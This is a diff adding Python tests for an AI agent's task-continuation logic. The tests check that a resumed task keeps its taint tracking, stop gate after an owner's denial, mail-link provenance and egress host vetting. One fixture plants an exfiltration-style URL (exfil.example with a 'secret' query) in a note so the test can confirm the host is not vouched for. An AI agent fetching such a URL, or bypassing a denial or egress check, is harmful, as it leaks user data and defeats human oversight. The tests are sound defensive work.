@@ -14905,3 +14905,241 @@ class TestCreateSkill:
         assert "status: disabled" in live.read_text()
         result = tool_messages(agent.messages)[0]["content"]
         assert "retired" in result
+
+
+def _carried(**fields) -> session_module.CarriedWork:
+    base = dict(
+        prompt="find the order mails", images=(), documents=(), calls=(), results=(),
+        sources=(), stop_gate=None, cut_off="model unavailable: 503",
+    )
+    return session_module.CarriedWork(**{**base, **fields})
+
+
+class TestAContinuationInheritsTheRestrictions:
+    """#387: a Retry that CONTINUES a question runs a fresh `run_task`, whose
+    reset would hand the same question — holding the same fetched pages — a
+    fence that is down. The continuation is exactly as restricted as the
+    attempts it continues, and nothing it inherits is a grant."""
+
+    NOTE = session_module.RESUME_MARKER + " aish's previous attempt was cut off"
+
+    @staticmethod
+    def _looking(agent, chat, seen: list):
+        def look(**kwargs):
+            seen.append(agent._tainted)
+            return chat(**kwargs)
+
+        agent.chat = look
+
+    def test_a_search_in_the_dead_attempt_taints_the_continuation(self):
+        agent, chat = make_agent([model_says("done")])
+        seen: list[bool] = []
+        self._looking(agent, chat, seen)
+        agent.run_task(
+            self.NOTE,
+            continuing=_carried(calls=(("web_search", {"query": "q1"}, False),)),
+        )
+        assert seen == [True]
+
+    def test_a_local_read_does_not(self):
+        """Exactness in the other direction: the fence rises for what brought
+        the outside in, not for every carried call."""
+        agent, chat = make_agent([model_says("done")])
+        seen: list[bool] = []
+        self._looking(agent, chat, seen)
+        agent.run_task(
+            self.NOTE,
+            continuing=_carried(calls=(("read_file", {"path": "notes.txt"}, False),)),
+        )
+        assert seen == [False]
+
+    def test_a_cut_argument_counts_as_outside(self):
+        """The record caps arguments; where the rule depends on a cut one,
+        taint failing to rise is the direction that may never happen."""
+        agent, chat = make_agent([model_says("done")])
+        seen: list[bool] = []
+        self._looking(agent, chat, seen)
+        agent.run_task(
+            self.NOTE,
+            continuing=_carried(calls=(("read_pdf", {"source": "/tmp/x…"}, True),)),
+        )
+        assert seen == [True]
+
+    def test_a_log_without_call_records_falls_back_to_tool_names(self):
+        agent, chat = make_agent([model_says("done")])
+        seen: list[bool] = []
+        self._looking(agent, chat, seen)
+        agent.run_task(self.NOTE, continuing=_carried(results=(("read_url", "PAGE"),)))
+        assert seen == [True]
+
+    def test_an_armed_stop_gate_stays_armed(self, tmp_path):
+        """Deny means stop, and a failed model call is not an answer to the
+        denial: the continuation must reply in words before it may act."""
+        marker = tmp_path / "ran"
+        steps: list[dict] = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[tool_call("run_command", command=f"touch {marker}")]),
+                model_says("Understood — I will not touch it."),
+            ],
+            step_log=steps.append,
+        )
+        agent.run_task(
+            self.NOTE,
+            continuing=_carried(stop_gate={
+                "armed_by_call": 3, "armed_by": "denial_comment",
+                "comment": "not that file", "turn": 7,
+            }),
+        )
+        assert not marker.exists()
+        gates = [s for s in steps if s.get("kind") == "gate" and s.get("gate") == "stop_gate"]
+        assert gates[0]["verdict"] == "refused"
+        assert gates[0]["evidence"]["armed_by"] == "carried_over"
+        assert gates[0]["evidence"]["from_turn"] == 7
+        assert gates[0]["evidence"]["from_call"] == 3
+        assert gates[0]["evidence"]["comment"] == "not that file"
+        assert any(g["verdict"] == "refused" and g.get("tool") == "run_command" for g in gates)
+        assert gates[-1]["verdict"] == "allowed"
+
+    def test_rules_and_knowledge_are_selected_for_the_question(self, monkeypatch):
+        """The note is aish's plumbing; a rule that bound the question binds
+        its continuation too, or the answer escapes it."""
+        agent, _ = make_agent([model_says("done")])
+        seeded: list[str] = []
+        monkeypatch.setattr(agent, "seed_rules", lambda task, *_a: seeded.append(task) or "")
+        agent.run_task(self.NOTE, continuing=_carried())
+        assert seeded == ["find the order mails"]
+
+    def test_the_note_never_vouches_a_host(self):
+        """aish composed the note — from a recorded error and from the MODEL's
+        own arguments to calls that never reported back. A host read out of it
+        would be laundered into "the owner typed this", and the egress gate
+        would stop asking about it. The question he typed is what counts."""
+        agent, _ = make_agent([model_says("done")])
+        note = (
+            self.NOTE + "\n\nCut off mid-step. These had STARTED …:\n"
+            "- read_url: https://exfil.example/?d=secret"
+        )
+        agent.run_task(
+            note, continuing=_carried(prompt="compare prices at https://shop.example/")
+        )
+        assert "exfil.example" not in agent._owner_hosts
+        assert "shop.example" in agent._owner_hosts
+
+    def test_a_reopened_chat_does_not_vouch_its_notes_either(self):
+        agent, _ = make_agent([])
+        agent.load_history([
+            {"role": "user", "content": "compare prices at https://shop.example/"},
+            {"role": "user", "content": self.NOTE + "\n- read_url: https://exfil.example/"},
+        ])
+        assert "exfil.example" not in agent._owner_hosts
+        assert "shop.example" in agent._owner_hosts
+
+    def test_values_typed_before_ride_every_later_press(self):
+        """A chat can be reopened cold while its page is still open in Chrome
+        holding what the dead attempt typed. The log keeps the values, not
+        reliably the page each went into — so they ride every press."""
+        agent, _ = make_agent([model_says("done")])
+        agent.run_task(self.NOTE, continuing=_carried(calls=(
+            ("browse_act", {"action": "type", "target": "Search", "text": "my notes"}, False),
+        )))
+        riding = agent._values_riding_this_press(
+            "browse_act", {"action": "click", "target": "Go"}, "anywhere.example"
+        )
+        assert ("Search", "my notes") in riding
+
+    def test_an_unnamed_tool_result_counts_as_outside(self):
+        agent, chat = make_agent([model_says("done")])
+        seen: list[bool] = []
+        self._looking(agent, chat, seen)
+        agent.run_task(self.NOTE, continuing=_carried(results=(("", "whatever"),)))
+        assert seen == [True]
+
+    RESET_MAIL = "Resetowanie hasła. Kliknij, aby zresetować hasło: https://eon.test/r?t=abc"
+
+    def test_a_mail_plugin_deleted_before_the_press_still_marks_its_links(self):
+        """The dead attempt held these links as mail links; a TOOL.md deleted
+        between the death and the press must not hand them back unmarked."""
+        agent, _ = make_agent([model_says("done")])
+        agent.run_task(
+            self.NOTE, continuing=_carried(results=(("tuta_read", self.RESET_MAIL),))
+        )
+        assert agent._mail_links == {
+            "https://eon.test/r?t=abc": agent_module.provenance.SIGN_IN
+        }
+
+    def test_an_unnamed_tool_results_links_count_as_mail(self):
+        agent, _ = make_agent([model_says("done")])
+        agent.run_task(self.NOTE, continuing=_carried(results=(("", self.RESET_MAIL),)))
+        assert "https://eon.test/r?t=abc" in agent._mail_links
+
+    def test_a_page_whose_entry_is_gone_counts_as_mail(self):
+        agent, _ = make_agent([model_says("done")])
+        agent.run_task(self.NOTE, continuing=_carried(
+            calls=(("read_tool_output", {"continuation": "deadbeef"}, False),),
+            results=(("read_tool_output", self.RESET_MAIL),),
+        ))
+        assert "https://eon.test/r?t=abc" in agent._mail_links
+
+    def test_a_native_tools_links_are_not_mail(self):
+        """Exactness in the other direction: a native tool is never mail."""
+        agent, _ = make_agent([model_says("done")])
+        agent.run_task(
+            self.NOTE, continuing=_carried(results=(("read_url", self.RESET_MAIL),))
+        )
+        assert agent._mail_links == {}
+
+    def test_sources_read_before_carry_into_the_answer(self):
+        agent, _ = make_agent([model_says("done")])
+        agent.run_task(self.NOTE, continuing=_carried(sources=("https://a.example/",)))
+        assert agent.task_sources == [{"url": "https://a.example/"}]
+
+    def test_a_crashed_batch_is_paired_and_logged(self):
+        logged: list[dict] = []
+        agent, chat = make_agent([model_says("ok")], on_message=logged.append)
+        agent.messages += [
+            {"role": "user", "content": "find it"},
+            {"role": "assistant", "content": "", "tool_calls": [
+                {"function": {"name": "web_search", "arguments": {"query": "a"}}},
+                {"function": {"name": "web_search", "arguments": {"query": "b"}}},
+            ]},
+            {"role": "tool", "tool_name": "web_search", "content": "A"},
+        ]
+        agent.run_task(self.NOTE, continuing=_carried(cut_off="task failed: boom"))
+        sent = chat.calls[0]["messages"]
+        results = [m for m in sent if m.get("role") == "tool"]
+        assert results[0]["content"] == "A"
+        assert results[1]["content"].startswith("(no result")
+        assert "task failed: boom" in results[1]["content"]
+        assert any(str(r.get("content", "")).startswith("(no result") for r in logged)
+
+
+class TestRewindWalksBackToTheTypedQuestion:
+    """#387: Retry regenerates the question the owner TYPED. aish's own user
+    messages — a continuation note, a nudge — and typed steering are not it."""
+
+    def test_over_a_continuation_note(self):
+        agent, _ = make_agent([])
+        reminder = agent_module.TASK_REMINDER_MARK + " rules"
+        agent.messages += [
+            {"role": "user", "content": "earlier"},
+            {"role": "assistant", "content": "answered"},
+            {"role": "user", "content": "the question"},
+            {"role": "tool", "tool_name": "web_search", "content": "R"},
+            {"role": "system", "content": reminder},
+            {"role": "user", "content": session_module.RESUME_MARKER + " cut off"},
+            {"role": "user", "content": "steering typed mid-continuation"},
+            {"role": "user", "content": AISH_NOTE + "wrap up]"},
+        ]
+        assert agent.rewind_last_task() == "the question"
+        assert [m["content"] for m in agent.messages[1:]] == ["earlier", "answered"]
+
+    def test_a_reminder_marks_the_question_over_later_steering(self):
+        agent, _ = make_agent([])
+        agent.messages += [
+            {"role": "system", "content": agent_module.TASK_REMINDER_MARK + " r"},
+            {"role": "user", "content": "the question"},
+            {"role": "assistant", "content": "", "tool_calls": []},
+            {"role": "user", "content": "also check the spam folder"},
+        ]
+        assert agent.rewind_last_task() == "the question"
